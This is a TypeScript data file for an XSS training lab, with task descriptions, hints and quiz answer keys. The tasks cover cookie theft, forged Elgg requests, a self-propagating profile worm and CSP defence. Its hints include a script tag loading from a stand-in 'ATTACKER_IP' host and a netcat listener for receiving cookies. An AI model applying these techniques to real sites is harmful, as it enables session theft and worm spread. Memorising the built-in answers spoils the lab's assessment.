// src/data/tasks.ts
// Authoritative task definitions — answers are kept server-side only

export interface Question {
  id: string;
  text: string;
  answer: string;
  placeholder: string;
  xp: number;
}

export interface Task {
  id: string;
  number: number;
  title: string;
  category: string;
  xp: number;
  description: string;
  hasFlag: boolean;
  questions: Question[];
  hints: string[];
}

export const tasks: Task[] = [
  {
    id: 'task1',
    number: 1,
    title: 'Introduction & Setup',
    category: 'Setup',
    xp: 10,
    description: 'Welcome to the XSS Attack Lab. Understand the environment, target app, and lab structure.',
    hasFlag: false,
    questions: [],
    hints: [],
  },
  {
    id: 'task2',
    number: 2,
    title: 'Alert & Cookie Display',
    category: 'Exploit',
    xp: 40,
    description: 'Inject JavaScript into Elgg profile fields to display alert windows and reveal session cookies.',
    hasFlag: false,
    hints: [
      'The Brief Description field in Elgg renders raw HTML when countermeasures are disabled.',
      'document.cookie returns all cookies accessible to JavaScript on the current origin.',
      'For longer scripts, host them externally and use: <script src="http://ATTACKER_IP/payload.js">',
    ],
    questions: [
      {
        id: 'q2_1',
        text: 'Which HTML tag is used to embed JavaScript directly in a web page?',
        answer: 'script',
        placeholder: 'tag name (no angle brackets)',
        xp: 10,
      },
      {
        id: 'q2_2',
        text: 'What JavaScript property returns all cookies set for the current page origin?',
        answer: 'document.cookie',
        placeholder: 'object.property notation',
        xp: 15,
      },
      {
        id: 'q2_3',
        text: 'What attribute of the <script> tag loads JavaScript from an external URL?',
        answer: 'src',
        placeholder: 'attribute name',
        xp: 15,
      },
    ],
  },
  {
    id: 'task3',
    number: 3,
    title: 'Stealing Cookies via Network',
    category: 'Exploit',
    xp: 60,
    description: "Exfiltrate session cookies to the attacker's machine using an injected <img> tag and a netcat listener.",
    hasFlag: false,
    hints: [
      'An <img> tag fires an HTTP GET for its src URL — even when the URL is not an image.',
      'escape() URL-encodes the cookie string so special chars (=, ;, %) survive the query parameter.',
      'Run nc -lknv 5555 on the attacker VM before the victim visits the profile.',
    ],
    questions: [
      {
        id: 'q3_1',
        text: 'What HTTP method does a browser use when fetching an <img src="...">?',
        answer: 'GET',
        placeholder: 'HTTP method',
        xp: 15,
      },
      {
        id: 'q3_2',
        text: 'What netcat flag keeps the listener alive for multiple sequential connections?',
        answer: '-k',
        placeholder: 'single flag character',
        xp: 15,
      },
      {
        id: 'q3_3',
        text: 'Why must document.cookie be URL-encoded before embedding in a query string?',
        answer: 'special characters',
        placeholder: 'two words',
        xp: 30,
      },
    ],
  },
  {
    id: 'task4',
    number: 4,
    title: "Becoming the Victim's Friend",
    category: 'Exploit',
    xp: 80,
    description: "Forge an AJAX GET request from inside the victim's browser to silently add Samy to their friend list.",
    hasFlag: false,
    hints: [
      'Capture the real add-friend request using Firefox HTTP Header Live or DevTools Network tab.',
      "View Samy's profile page source (Ctrl+U) and search for \"guid\" to find his user ID.",
      'The __elgg_ts and __elgg_token values are available on the page as elgg.security.token.*',
    ],
    questions: [
      {
        id: 'q4_1',
        text: 'What do Lines 1 and 2 (var ts and var token) provide, and why are they necessary to include?',
        answer: 'csrf token',
        placeholder: 'two words',
        xp: 25,
      },
      {
        id: 'q4_2',
        text: 'If Elgg only offered Editor mode (no HTML mode) for About Me, could this attack still work?',
        answer: 'yes',
        placeholder: 'yes or no',
        xp: 25,
      },
      {
        id: 'q4_3',
        text: 'Which HTTP method does the Elgg add-friend endpoint use?',
        answer: 'GET',
        placeholder: 'HTTP method',
        xp: 30,
      },
    ],
  },
  {
    id: 'task5',
    number: 5,
    title: "Modifying the Victim's Profile",
    category: 'Exploit',
    xp: 80,
    description: "Forge an authenticated POST request that overwrites every visitor's About Me description.",
    hasFlag: false,
    hints: [
      'Capture the edit-profile POST with HTTP Header Live while manually editing your own profile.',
      'The POST body needs: name, description, guid, accesslevel[description], plus the CSRF tokens.',
      "Use elgg.session.user.guid to get the current viewer's guid dynamically — never hardcode the victim's ID.",
    ],
    questions: [
      {
        id: 'q5_1',
        text: "Line 1 checks elgg.session.user.guid != samyGuid. What happens to Samy's own profile if you remove this guard?",
        answer: 'samy',
        placeholder: "whose profile gets overwritten?",
        xp: 40,
      },
      {
        id: 'q5_2',
        text: 'What Content-Type header is required for the POST body to be parsed correctly by Elgg?',
        answer: 'application/x-www-form-urlencoded',
        placeholder: 'MIME type string',
        xp: 40,
      },
    ],
  },
  {
    id: 'task6',
    number: 6,
    title: 'Self-Propagating XSS Worm',
    category: 'Exploit',
    xp: 100,
    description: "Build a DOM-based worm that copies itself into every victim's profile and spreads exponentially.",
    hasFlag: false,
    hints: [
      'Give the <script> tag an id="worm" attribute, then read its own code via document.getElementById("worm").innerHTML.',
      'The worm code contains <, >, ", and & — use encodeURIComponent() before embedding it in the POST body.',
      "The worm sets itself as the victim's description value, so anyone who views the victim's profile also runs it.",
    ],
    questions: [
      {
        id: 'q6_1',
        text: 'Which DOM API method does the worm use to retrieve a copy of its own source code?',
        answer: 'getElementById',
        placeholder: 'method name only',
        xp: 30,
      },
      {
        id: 'q6_2',
        text: 'Why is encodeURIComponent() applied to the worm code before it is embedded in the POST body?',
        answer: 'url encoding',
        placeholder: 'two words',
        xp: 35,
      },
      {
        id: 'q6_3',
        text: 'What is the real-world worm from 2005 that used this exact technique against MySpace?',
        answer: 'samy worm',
        placeholder: 'name of the worm',
        xp: 35,
      },
    ],
  },
  {
    id: 'task7',
    number: 7,
    title: 'Defeating XSS with CSP',
    category: 'Defense',
    xp: 60,
    description: 'Use Content Security Policy HTTP headers to block inline scripts and restrict trusted script sources.',
    hasFlag: false,
    hints: [
      "CSP is delivered as a response header: Content-Security-Policy: default-src 'self'; ...",
      "script-src 'self' allows scripts only from the same origin. Wildcards like *.example70.com extend this.",
      "A nonce (nonce-111-111-111) allows a specific inline script block without permitting all inline scripts.",
    ],
    questions: [
      {
        id: 'q7_1',
        text: "What does the CSP directive default-src 'self' mean in plain English?",
        answer: 'same origin',
        placeholder: 'two words',
        xp: 15,
      },
      {
        id: 'q7_2',
        text: "Which CSP mechanism allows a single trusted inline script without enabling 'unsafe-inline'?",
        answer: 'nonce',
        placeholder: 'one word',
        xp: 15,
      },
      {
        id: 'q7_3',
        text: "Why does CSP block <script>alert(1)</script> injected by an attacker into a CSP-protected page?",
        answer: 'inline scripts blocked',
        placeholder: 'three words',
        xp: 15,
      },
      {
        id: 'q7_4',
        text: "What command restarts the Apache server after modifying apache_csp.conf?",
        answer: 'service apache2 restart',
        placeholder: 'full command',
        xp: 15,
      },
    ],
  },
];
